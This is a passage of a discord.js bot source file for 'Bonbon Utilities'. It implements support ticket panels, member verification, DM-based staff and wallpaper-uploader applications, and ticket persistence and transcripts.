const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType, PermissionFlagsBits, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const fs = require('fs');

// ============================================
// ENVIRONMENT VARIABLES
// ============================================
const {
    BOT_TOKEN,
    GUILD_ID,
    STAFF_ROLES,
    REVIEWER_ROLE_ID,
    ACCEPTED_ROLE_ID,
    BANNER_URL = "https://media.discordapp.net/attachments/1480969775344652470/1496647110525845625/DF7E4FDA-66D3-49FF-BD5E-7C746253AE2D.png",
    VERIFY_BANNER_URL,
    TICKET_CATEGORY_ID,
    TICKET_LOG_CHANNEL_ID,
    TRANSCRIPT_CHANNEL_ID,
    APP_PANEL_CHANNEL_ID,
    APP_REVIEW_CHANNEL_ID,
    APP_ACCEPTED_CHANNEL_ID,
    APP_REJECTED_CHANNEL_ID
} = process.env;

// ============================================
// CLIENT INITIALIZATION
// ============================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.DirectMessages
    ],
    partials: [Partials.Channel, Partials.Message]
});

// ============================================
// CONFIGURATION
// ============================================
const TICKET_PANEL_CHANNEL_ID_NEW = "1511854009139331255";
const TICKET_PANEL_CHANNEL_ID_NORMAL = "1511873447641223381";
const TICKET_LOG_CHANNEL_ID_NEW = "1511854023127339088";
const SUPPORT_ROLE_ID = "1511853901937119322";

// VERIFICATION SYSTEM
const VERIFY_CHANNEL_ID = "1558503393226530947";
const UNVERIFIED_ROLE_ID = "1557761141575262298";
const VERIFIED_ROLE_ID = "1557761111242051704";

const TICKET_TYPES = {
    help: { name: "Help", emoji: "🎫", color: "#38BDF8", desc: "Press to open a ticket for general assistance" },
    report: { name: "Report", emoji: "⚠️", color: "#EF4444", desc: "Press to open a ticket to report a player or bug" }
};

const NORMAL_TICKET_TYPES = {
    general: { name: "General Support", emoji: "📝", color: "#5865F2", desc: "General questions and assistance" },
    question: { name: "Question", emoji: "❓", color: "#FEE75C", desc: "Ask anything you want to know" },
    feedback: { name: "Feedback", emoji: "💬", color: "#57F287", desc: "Share your feedback or suggestions" },
    other: { name: "Other", emoji: "📌", color: "#9B59B6", desc: "Any other topic not listed above" }
};

const APPLICATION_POSITIONS = {
    staff: { name: "🛠 Staff Team", emoji: "🛠", color: "#5865F2", description: "Help moderate and manage the community", roleId: "1508204459799613634" },
    wallpaper: { name: "🖼 Wallpaper Uploader", emoji: "🖼", color: "#9C27B0", description: "Submit high-quality PC and mobile wallpapers", roleId: "1509922150138646680" },
    event: { name: "🎉 Event Hoster", emoji: "🎉", color: "#FEE75C", description: "Organize fun community events", roleId: "1509922272323043461" },
    partnership: { name: "🤝 Partnership", emoji: "🤝", color: "#57F287", description: "Handle collaborations and partnerships", roleId: null },
    developer: { name: "💻 Developer", emoji: "💻", color: "#17A2B8", description: "Work on bots and coding projects", roleId: "1509921949717893201" }
};

const STANDARD_APPLICATION_QUESTIONS = [
    { id: "fullname", question: "📝 What's your name ?", example: "Example: John Doe" },
    { id: "age", question: "🎂 How old are you ?", example: "Example: 18" },
    { id: "why", question: "💭 Why do you want to join Staff Team ?", example: "Example: I want to help the community grow..." },
    { id: "skills", question: "🛠️ Do you have skills ? What are they ?", example: "Example: Graphic design, moderation, coding..." },
    { id: "experience", question: "📜 Do you have experience ?", example: "Example: I was a mod on another server..." },
    { id: "availability", question: "⏰ How many hours can you be online ?", example: "Example: 3-4 hours per day" },
    { id: "device", question: "💻 Device :\nOption 1 : phone\nOption 2 : Computer\nOption 3 : Both/Bjouj bihom", example: "Example: Computer" }
];

const WALLPAPER_APPLICATION_QUESTIONS = [
    { id: "type", question: "🖼 What type of wallpapers do you upload?", example: "Example: Gaming, Nature, Anime, Abstract, Minimalist, etc." },
    { id: "platform", question: "📱 PC or Mobile wallpapers? (Or both)", example: "Example: Both, PC (1920x1080), Mobile (1080x2340)" },
    { id: "origin", question: "🎨 Do you create wallpapers or collect them from other sources?", example: "Example: I create my own using Photoshop / I collect from various artists (with credit)" },
    { id: "portfolio", question: "🔗 Send wallpaper examples or portfolio links", example: "Example: https://imgur.com/a/..., https://deviantart.com/..." },
    { id: "activity", question: "⏱️ How active will you be uploading wallpapers? (Weekly / Daily)", example: "Example: I will upload 5-10 wallpapers per week" },
    { id: "motivation", question: "💡 Why do you want to upload wallpapers in this server?", example: "Example: I love sharing art and want to help grow the wallpaper community here." }
];

const staffRolesArray = STAFF_ROLES ? STAFF_ROLES.split(',').map(r => r.trim()).filter(r => r.length > 0) : [];
const reviewerRolesArray = REVIEWER_ROLE_ID ? REVIEWER_ROLE_ID.split(',').map(r => r.trim()).filter(r => r.length > 0) : [];

const allTicketAccessRoles = [...staffRolesArray];
if (SUPPORT_ROLE_ID && !allTicketAccessRoles.includes(SUPPORT_ROLE_ID)) {
    allTicketAccessRoles.push(SUPPORT_ROLE_ID);
}

const TICKET_STORAGE_FILE = '/tmp/active_tickets.json';
let activeTickets = new Map();
let activeApplications = new Map();

// ============================================
// TICKET PERSISTENCE FUNCTIONS
// ============================================
function saveActiveTickets() {
    try {
        const ticketsToSave = [];
        for (const [channelId, data] of activeTickets) {
            ticketsToSave.push({
                channelId, userId: data.userId, userTag: data.userTag,
                type: data.type, createdAt: data.createdAt,
                claimedBy: data.claimedBy || null, claimedAt: data.claimedAt || null
            });
        }
        fs.writeFileSync(TICKET_STORAGE_FILE, JSON.stringify(ticketsToSave, null, 2));
        console.log(`💾 Saved ${ticketsToSave.length} active tickets to storage`);
    } catch (error) { console.error('Failed to save tickets:', error.message); }
}

function loadActiveTickets() {
    try {
        if (fs.existsSync(TICKET_STORAGE_FILE)) {
            const data = fs.readFileSync(TICKET_STORAGE_FILE, 'utf8');
            const tickets = JSON.parse(data);
            activeTickets.clear();
            for (const ticket of tickets) {
                activeTickets.set(ticket.channelId, {
                    userId: ticket.userId, userTag: ticket.userTag, type: ticket.type,
                    createdAt: ticket.createdAt, claimedBy: ticket.claimedBy, claimedAt: ticket.claimedAt
                });
            }
            console.log(`📂 Loaded ${activeTickets.size} active tickets from storage`);
            return true;
        }
    } catch (error) { console.error('Failed to load tickets:', error.message); }
    return false;
}

async function verifyAndCleanTickets(guild) {
    const validTickets = new Map();
    for (const [channelId, ticketData] of activeTickets) {
        const channel = guild.channels.cache.get(channelId);
        if (channel && channel.parentId === TICKET_CATEGORY_ID) {
            validTickets.set(channelId, ticketData);
        } else {
            console.log(`🗑️ Removing invalid ticket: ${channelId}`);
        }
    }
    activeTickets = validTickets;
    saveActiveTickets();
    console.log(`✅ Verified tickets: ${activeTickets.size} valid tickets remaining`);
}

// ============================================
// HELPER FUNCTIONS
// ============================================
async function sendLog(guild, channelId, embed) {
    if (!channelId) return;
    const channel = guild.channels.cache.get(channelId);
    if (channel) {
        await channel.send({ embeds: [embed] }).catch(err => console.error(`Failed to send log:`, err.message));
    }
}

async function generateTranscript(channel, ticketData) {
    try {
        const messages = await channel.messages.fetch({ limit: 200 });
        const sorted = Array.from(messages.values()).reverse();
        let transcript = `═══════════════════════════════════════════════════\n`;
        transcript += `                    🎫 TICKET TRANSCRIPT\n`;
        transcript += `═══════════════════════════════════════════════════\n\n`;
        transcript += `📋 Channel: ${channel.name}\n📅 Created: ${channel.createdAt.toLocaleString()}\n`;
        transcript += `👤 Owner: ${ticketData.userTag || "Unknown"}\n🆔 Channel ID: ${channel.id}\n`;
        transcript += `───────────────────────────────────────────────────\n\n`;
        for (const msg of sorted) {
            transcript += `[${msg.createdAt.toLocaleString()}] ${msg.author.tag}:\n${msg.content || '[Embed or Attachment]'}\n───────────────────────────────────────────────────\n`;
        }
        transcript += `\n📊 Transcript Generated: ${new Date().toLocaleString()}\n═══════════════════════════════════════════════════`;
        const filePath = `/tmp/transcript-${channel.id}-${Date.now()}.txt`;
        fs.writeFileSync(filePath, transcript);
        return filePath;
    } catch (error) { console.error(`Error generating transcript: ${error.message}`); return null; }
}

function canManageTickets(member) {
    if (!member) return false;
    if (SUPPORT_ROLE_ID && member.roles.cache.has(SUPPORT_ROLE_ID)) return true;
    if (staffRolesArray.length > 0 && staffRolesArray.some(roleId => member.roles.cache.has(roleId))) return true;
    if (member.permissions.has(PermissionFlagsBits.Administrator)) return true;
    return false;
}

function isReviewer(member) {
    if (!member) return false;
    if (reviewerRolesArray.length === 0) return false;
    return reviewerRolesArray.some(roleId => member.roles.cache.has(roleId));
}

function getSupportRoleMention() {
    if (SUPPORT_ROLE_ID) return `<@&${SUPPORT_ROLE_ID}>`;
    return "";
}

function getTicketAccessRoles() {
    const roles = [];
    if (SUPPORT_ROLE_ID) roles.push(SUPPORT_ROLE_ID);
    roles.push(...staffRolesArray);
    return roles;
}

function getTicketPermissionOverwrites() {
    const roleIds = getTicketAccessRoles();
    return roleIds.map(roleId => ({
        id: roleId,
        allow: [
            PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages,
            PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles,
            PermissionFlagsBits.AddReactions, PermissionFlagsBits.UseExternalEmojis
        ]
    }));
}

async function safeChannelBulkDelete(channel, limit = 10) {
    try {
        const messages = await channel.messages.fetch({ limit });
        if (messages.size === 0) return;
        const filteredMessages = messages.filter(msg => Date.now() - msg.createdTimestamp < 1209600000);
        if (filteredMessages.size > 0) await channel.bulkDelete(filteredMessages);
        for (const msg of messages.filter(msg => Date.now() - msg.createdTimestamp >= 1209600000).values()) {
            await msg.delete().catch(() => {});
        }
    } catch (error) {
        const messages = await channel.messages.fetch({ limit }).catch(() => []);
        for (const msg of messages) await msg.delete().catch(() => {});
    }
}

// ============================================
// TICKET PANEL - MINECRAFT
// ============================================
async function createMinecraftTicketPanel(channel) {
    await safeChannelBulkDelete(channel, 10);
    const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setTitle("Bonbon Utilities | Cj & RCS crack か")
        .setDescription(
            `**Minecraft Support Tickets**\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**Help**\nPress to open a ticket for general assistance\n\n` +
            `**Report**\nPress to open a ticket to report a player or bug\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `2026 BONBON™. We are here to help you!`
        )
        .setFooter({ text: "Premium Support System • 24/7", iconURL: client.user.displayAvatarURL() })
        .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('ticket_help').setLabel("Help").setEmoji("🎫").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('ticket_report').setLabel("Report").setEmoji("⚠️").setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [embed], components: [row] });
}

// ============================================
// TICKET PANEL - NORMAL
// ============================================
async function createNormalTicketPanel(channel) {
    await safeChannelBulkDelete(channel, 10);
    const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setTitle("Bonbon Utilities | Cj & RCS crack か")
        .setDescription(
            `**📬 General Support Tickets**\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**📝 General Support**\nOpen a ticket for general questions and assistance\n\n` +
            `**❓ Question**\nAsk anything you want to know\n\n` +
            `**💬 Feedback**\nShare your feedback or suggestions\n\n` +
            `**📌 Other**\nAny other topic not listed above\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `2026 BONBON™. We are here to help you!`
        )
        .setFooter({ text: "Support System • 24/7", iconURL: client.user.displayAvatarURL() })
        .setTimestamp();
    const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('normal_ticket_general').setLabel("General Support").setEmoji("📝").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('normal_ticket_question').setLabel("Question").setEmoji("❓").setStyle(ButtonStyle.Success)
    );
    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('normal_ticket_feedback').setLabel("Feedback").setEmoji("💬").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('normal_ticket_other').setLabel("Other").setEmoji("📌").setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [embed], components: [row1, row2] });
}

// ============================================
// VERIFY PANEL
// ============================================
async function createVerifyPanel(channel) {
    await safeChannelBulkDelete(channel, 10);
    const imageToUse = VERIFY_BANNER_URL || BANNER_URL;
    const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setTitle("Bonbon Utilities | ✅ Verification")
        .setDescription(
            `**Welcome to Bonbon Utilities!**\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**📌 How to verify:**\n` +
            `Click the button below to verify yourself and gain access to the server.\n\n` +
            `**🔓 Once verified you will get:**\n` +
            `• Access to all public channels\n` +
            `• Ability to chat and interact\n` +
            `• Access to events and giveaways\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**2026 BONBON™. Verify now!**`
        )
        .setImage(imageToUse)
        .setFooter({ text: "Verification System", iconURL: client.user.displayAvatarURL() })
        .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('verify_user').setLabel('Verify').setEmoji('✅').setStyle(ButtonStyle.Success)
    );
    await channel.send({ embeds: [embed], components: [row] });
}

// ============================================
// APPLICATION PANEL
// ============================================
async function createApplicationPanel(channel) {
    await safeChannelBulkDelete(channel, 10);
    const embed = new EmbedBuilder()
        .setTitle("Bonbon Utilities | Cj & RCS crack か")
        .setDescription(
            `> **📋 STAFF & CONTRIBUTOR APPLICATION SYSTEM**\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**📌 AVAILABLE POSITIONS**\n` +
            `• 🛠 **Staff Team** - Moderate and manage the server\n` +
            `• 🖼 **Wallpaper Uploader** - Submit high-quality PC and mobile wallpapers\n` +
            `• 🎉 **Event Hoster** - Organize fun community events\n` +
            `• 🤝 **Partnership** - Handle collaborations and partnerships\n` +
            `• 💻 **Developer** - Work on bots and coding projects\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**📝 APPLICATION PROCESS**\n` +
            `1️⃣ Select a position from the dropdown below\n` +
            `2️⃣ The bot will DM you with questions\n` +
            `3️⃣ Answer each question in the DM\n` +
            `4️⃣ Your application will be submitted for review\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**✅ REQUIREMENTS**\n` +
            `• Be active and responsible\n` +
            `• Have good communication skills\n` +
            `• Follow server rules and guidelines\n` +
            `• Be at least 13 years old (Discord ToS)\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `*Select a position to begin your application* 🚀`
        )
        .setColor(0x2b2d31)
        .setImage(BANNER_URL)
        .setFooter({ text: "Application System • DM Based", iconURL: client.user.displayAvatarURL() })
        .setTimestamp();
    const selectMenu = new StringSelectMenuBuilder()
        .setCustomId('apply_select')
        .setPlaceholder('🎯 Select a position to apply for...')
        .addOptions([
            new StringSelectMenuOptionBuilder().setLabel('🛠 Staff Team').setDescription('Apply for a staff position').setEmoji('🛠').setValue('staff'),
            new StringSelectMenuOptionBuilder().setLabel('🖼 Wallpaper Uploader').setDescription('Submit high-quality PC and mobile wallpapers').setEmoji('🖼').setValue('wallpaper'),
            new StringSelectMenuOptionBuilder().setLabel('🎉 Event Hoster').setDescription('Apply as an event hoster').setEmoji('🎉').setValue('event'),
            new StringSelectMenuOptionBuilder().setLabel('🤝 Partnership').setDescription('Apply for partnerships').setEmoji('🤝').setValue('partnership'),
            new StringSelectMenuOptionBuilder().setLabel('💻 Developer').setDescription('Apply as a developer').setEmoji('💻').setValue('developer')
        ]);
    const row = new ActionRowBuilder().addComponents(selectMenu);
    await channel.send({ embeds: [embed], components: [row] });
}

// ============================================
// APPLICATION DM HANDLER
// ============================================
async function startApplication(user, position) {
    const positionConfig = APPLICATION_POSITIONS[position];
    if (!positionConfig) return false;
    if (activeApplications.has(user.id)) {
        await user.send("❌ You already have an active application in progress.\nType `cancel` to cancel it.").catch(() => {});
        return false;
    }
    const questions = position === 'wallpaper' ? WALLPAPER_APPLICATION_QUESTIONS : STANDARD_APPLICATION_QUESTIONS;
    const application = {
        userId: user.id, position, positionName: positionConfig.name,
        positionEmoji: positionConfig.emoji, positionColor: positionConfig.color,
        step: 0, answers: {}, timestamp: Date.now(), questions
    };
    activeApplications.set(user.id, application);
    const isWallpaper = position === 'wallpaper';
    const description = isWallpaper
        ? `You are applying to become a **Wallpaper Uploader**.\n\nPlease answer **${questions.length} questions**.\n\nType \`cancel\` at any time to cancel.`
        : `I will ask you **${questions.length} questions**.\nPlease answer each honestly.\n\n**Type \`cancel\` at any time to cancel.**\n\nLet's begin! 🚀`;
    const welcomeEmbed = new EmbedBuilder()
        .setTitle(`Bonbon Utilities | ${positionConfig.emoji} ${positionConfig.name} Application`)
        .setDescription(description)
        .setColor(typeof positionConfig.color === 'string' ? parseInt(positionConfig.color.replace('#', ''), 16) : positionConfig.color)
        .setTimestamp();
    await user.send({ embeds: [welcomeEmbed] }).catch(() => { activeApplications.delete(user.id); return false; });
    await sendNextQuestion(user.id);
    return true;
}

async function sendNextQuestion(userId) {
    const application = activeApplications.get(userId);
    if (!application) return;
    const questions = application.questions || STANDARD_APPLICATION_QUESTIONS;
    if (application.step >= questions.length) { await submitApplication(userId); return; }
    const question = questions[application.step];
    const questionEmbed = new EmbedBuilder()
        .setTitle(`Bonbon Utilities | 📝 Question ${application.step + 1}/${questions.length}`)
        .setDescription(`**${question.question}**\n\n\`\`\`${question.example}\`\`\``)
        .setColor(0x5865F2)
        .setFooter({ text: "Type your answer below • Type 'cancel' to cancel" });
    const user = await client.users.fetch(userId).catch(() => null);
    if (user) {
        await user.send({ embeds: [questionEmbed] }).catch(() => { activeApplications.delete(userId); });
    }
}

async function processAnswer(userId, answer) {
    const application = activeApplications.get(userId);
    if (!application) return;
    const questions = application.questions || STANDARD_APPLICATION_QUESTIONS;
    application.answers[questions[application.step].id] = answer;
    application.step++;
    activeApplications.set(userId, application);
    await sendNextQuestion(userId);
}

async function submitApplication(userId) {
    const application = activeApplications.get(userId);
    if (!application) return;
    const user = await client.users.fetch(userId).catch(() => null);
    if (!user) { activeApplications.delete(userId); return; }
    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) { activeApplications.delete(userId); return; }
    const reviewChannel = guild.channels.cache.get(APP_REVIEW_CHANNEL_ID);
    if (!reviewChannel) {
        await user.send("❌ Failed to submit. Contact an administrator.");
        activeApplications.delete(userId);
        return;
    }
    const embed = buildApplicationEmbed(application, user, null);
    const buttons = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`app_approve_${userId}_${application.position}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`app_deny_${userId}_${application.position}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setLabel('Voir Profil').setURL(`https://discord.com/users/${userId}`).setStyle(ButtonStyle.Link)
    );
    await reviewChannel.send({ embeds: [embed], components: [buttons] });
    const confirmEmbed = new EmbedBuilder()
        .setTitle("Bonbon Utilities | ✅ APPLICATION SUBMITTED")
        .setDescription(`Your application for **${application.positionName}** has been submitted!\n\nOur team will review it soon.`)
        .setColor(0x22C55E)
        .setTimestamp();
    await user.send({ embeds: [confirmEmbed] }).catch(() => {});
    activeApplications.delete(userId);
}

async function cancelApplication(userId) {
    const application = activeApplications.get(userId);
    if (!application) return false;
    activeApplications.delete(userId);
    const user = await client.users.fetch(userId).catch(() => null);
    if (user) {
        const cancelEmbed = new EmbedBuilder()
            .setTitle("Bonbon Utilities | ❌ Application Cancelled")
            .setDescription("Your application has been cancelled. You can start a new application anytime.")
            .setColor(0xEF4444)
            .setTimestamp();
        await user.send({ embeds: [cancelEmbed] }).catch(() => {});
    }
    return true;
}

function buildApplicationEmbed(application, user, status = null, reason = null) {
    const positionConfig = APPLICATION_POSITIONS[application.position];
    const isAccepted = status === 'accepted';
    const isRejected = status === 'rejected';
    let title = `${positionConfig.emoji} NEW APPLICATION - ${positionConfig.name}`;
    let color = typeof positionConfig.color === 'string' ? parseInt(positionConfig.color.replace('#', ''), 16) : positionConfig.color;
    let footerText = "Application awaiting review";
    if (isAccepted) { title = `${positionConfig.emoji} APPLICATION ACCEPTED - ${positionConfig.name}`; color = 0x22C55E; footerText = "Application approved"; }
    else if (isRejected) { title = `${positionConfig.emoji} APPLICATION DENIED - ${positionConfig.name}`; color = 0xEF4444; footerText = "Application denied"; }
    const embed = new EmbedBuilder()
        .setTitle(`Bonbon Utilities | ${title}`)
        .setDescription(
            `**Applicant:** ${user.tag} (<@${application.userId}>)\n` +
            `**Position:** ${positionConfig.name}\n` +
            `**Submitted:** <t:${Math.floor(application.timestamp / 1000)}:F>\n` +
            `**User ID:** \`${application.userId}\``
        )
        .setColor(color)
        .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 256 }))
        .setImage(BANNER_URL)
        .setTimestamp()
        .setFooter({ text: footerText });
    const isWallpaper = application.position === 'wallpaper';
    const standardLabels = {
        fullname: "📝 Full name", age: "🎂 Age", why: "💭 Why join staff team?",
        skills: "🛠️ Skills", experience: "📜 Experience", availability: "⏰ Availability", device: "💻 Device"
    };
    const wallpaperLabels = {
        type: "🖼 Wallpaper Types", platform: "📱 Platform", origin: "🎨 Origin (Created/Collected)",
        portfolio: "🔗 Portfolio / Examples", activity: "⏱️ Upload Activity", motivation: "💡 Motivation"
    };
    const labels = isWallpaper ? wallpaperLabels : standardLabels;
    for (const [key, value] of Object.entries(application.answers)) {
        const label = labels[key] || key;
        embed.addFields({ name: label, value: value.length > 1024 ? value.substring(0, 1021) + '...' : value, inline: false });
    }
    if (reason) embed.addFields({ name: "❌ Reason", value: `> ${reason}`, inline: false });
    return embed;
}

// ============================================
// READY EVENT
// ============================================
client.once('ready', async () => {
    console.log(`✨ ${client.user.tag} is online!`);
    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) { console.error("❌ Guild not found!"); return; }

    loadActiveTickets();
    await verifyAndCleanTickets(guild);

    const fixChannelPermissions = async (channelId) => {
        const channel = client.channels.cache.get(channelId);
        if (channel) {
            try {
                await channel.permissionOverwrites.edit(guild.id, { ViewChannel: true, ReadMessageHistory: true });
                console.log(`✅ Fixed permissions: ${channel.name}`);
            } catch (error) { console.error(`❌ Failed to fix ${channelId}:`, error.message); }
        }
    };

    await fixChannelPermissions(TICKET_PANEL_CHANNEL_ID_NEW);
    await fixChannelPermissions(TICKET_PANEL_CHANNEL_ID_NORMAL);
    await fixChannelPermissions(VERIFY_CHANNEL_ID);
    if (APP_PANEL_CHANNEL_ID) await fixChannelPermissions(APP_PANEL_CHANNEL_ID);

    const minecraftPanelChannel = client.channels.cache.get(TICKET_PANEL_CHANNEL_ID_NEW);
    if (minecraftPanelChannel) { await createMinecraftTicketPanel(minecraftPanelChannel); console.log("✅ Minecraft Ticket panel deployed!"); }

    const normalPanelChannel = client.channels.cache.get(TICKET_PANEL_CHANNEL_ID_NORMAL);
    if (normalPanelChannel) { await createNormalTicketPanel(normalPanelChannel); console.log("✅ Normal Ticket panel deployed!"); }

    const verifyPanelChannel = client.channels.cache.get(VERIFY_CHANNEL_ID);
    if (verifyPanelChannel) { await createVerifyPanel(verifyPanelChannel); console.log("✅ Verify panel deployed!"); }

    if (APP_PANEL_CHANNEL_ID) {
        const appPanelChannel = client.channels.cache.get(APP_PANEL_CHANNEL_ID);
        if (appPanelChannel) { await createApplicationPanel(appPanelChannel); console.log("✅ Application panel deployed!"); }
    }

    console.log(`🚀 Bot is ready!`);
});

// ============================================
// INTERACTION HANDLER
// ============================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    // MINECRAFT TICKET
    if (interaction.customId.startsWith('ticket_')) {
        const type = interaction.customId.replace('ticket_', '');
        const typeConfig = TICKET_TYPES[type];
        if (!typeConfig) return;
        for (const [id, data] of activeTickets) {
            if (data.userId === interaction.user.id) {
                return interaction.reply({
                    embeds: [new EmbedBuilder().setTitle("❌ TICKET LIMIT REACHED").setDescription(`> You already have an open ticket!\n**Channel:** <#${id}>`).setColor(0xEF4444)],
                    ephemeral: true
                });
            }
        }
        await interaction.reply({ embeds: [new EmbedBuilder().setDescription("🔄 `Creating your ticket...`").setColor(0x38BDF8)], ephemeral: true });
        try {
            const ticketChannel = await interaction.guild.channels.create({
                name: `${type}-${interaction.user.username}`,
                type: ChannelType.GuildText,
                parent: TICKET_CATEGORY_ID,
                topic: `Ticket Owner: ${interaction.user.tag} (${interaction.user.id}) | Type: ${typeConfig.name}`,
                permissionOverwrites: [
                    { id: interaction.guild.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles] },
                    ...getTicketPermissionOverwrites()
                ]
            });
            activeTickets.set(ticketChannel.id, { userId: interaction.user.id, userTag: interaction.user.tag, type: typeConfig.name, createdAt: Date.now() });
            saveActiveTickets();
            const welcomeEmbed = new EmbedBuilder()
                .setTitle(`Bonbon Utilities | ${typeConfig.emoji} ${typeConfig.name.toUpperCase()} TICKET`)
                .setDescription(
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**👋 Welcome ${interaction.user}!**\n\n` +
                    `> **Ticket Type:** ${typeConfig.name}\n> **Category:** ${typeConfig.desc}\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**📝 INSTRUCTIONS**\n• Please describe your issue in detail\n• Attach screenshots if possible\n• Our team will respond shortly\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**🔒 TICKET CONTROLS**\n• Click **Close Ticket** to end\n• Click **Claim Ticket** to assign a staff member\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
                )
                .setColor(typeConfig.color).setImage(BANNER_URL)
                .setFooter({ text: `Ticket ID: ${ticketChannel.id} | Support Team`, iconURL: interaction.guild.iconURL() })
                .setTimestamp();
            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('CLOSE TICKET').setEmoji('🔒').setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId('claim_ticket').setLabel('CLAIM TICKET').setEmoji('🎫').setStyle(ButtonStyle.Secondary)
            );
            await ticketChannel.send({ content: `${interaction.user} | ${getSupportRoleMention()}`, embeds: [welcomeEmbed], components: [actionRow] });
            await sendLog(interaction.guild, TICKET_LOG_CHANNEL_ID_NEW, new EmbedBuilder()
                .setTitle("Bonbon Utilities | 🎫 TICKET OPENED")
                .setDescription(`**User:** ${interaction.user.tag}\n**Type:** ${typeConfig.name}\n**Channel:** ${ticketChannel}`)
                .setColor(0x22C55E).setTimestamp());
            await interaction.editReply({
                embeds: [new EmbedBuilder().setTitle("Bonbon Utilities | ✅ TICKET CREATED")
                    .setDescription(`> Ticket created: ${ticketChannel}`).setColor(0x22C55E)], ephemeral: true
            });
        } catch (err) {
            console.error(err);
            await interaction.editReply({
                embeds: [new EmbedBuilder().setTitle("Bonbon Utilities | ❌ ERROR")
                    .setDescription("> Failed to create ticket.").setColor(0xEF4444)], ephemeral: true
            });
        }
    }

    // NORMAL TICKET
    else if (interaction.customId.startsWith('normal_ticket_')) {
        const type = interaction.customId.replace('normal_ticket_', '');
        const typeConfig = NORMAL_TICKET_TYPES[type];
        if (!typeConfig) return;
        for (const [id, data] of activeTickets) {
            if (data.userId === interaction.user.id) {
                return interaction.reply({
                    embeds: [new EmbedBuilder().setTitle("❌ TICKET LIMIT REACHED").setDescription(`> You already have an open ticket!\n**Channel:** <#${id}>`).setColor(0xEF4444)],
                    ephemeral: true
                });
            }
        }
        await interaction.reply({ embeds: [new EmbedBuilder().setDescription("🔄 `Creating your ticket...`").setColor(0x38BDF8)], ephemeral: true });
        try {
            const ticketChannel = await interaction.guild.channels.create({
                name: `${type}-${interaction.user.username}`,
                type: ChannelType.GuildText,
                parent: TICKET_CATEGORY_ID,
                topic: `Ticket Owner: ${interaction.user.tag} (${interaction.user.id}) | Type: ${typeConfig.name}`,
                permissionOverwrites: [
                    { id: interaction.guild.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles] },
                    ...getTicketPermissionOverwrites()
                ]
            });
            activeTickets.set(ticketChannel.id, { userId: interaction.user.id, userTag: interaction.user.tag, type: typeConfig.name, createdAt: Date.now() });
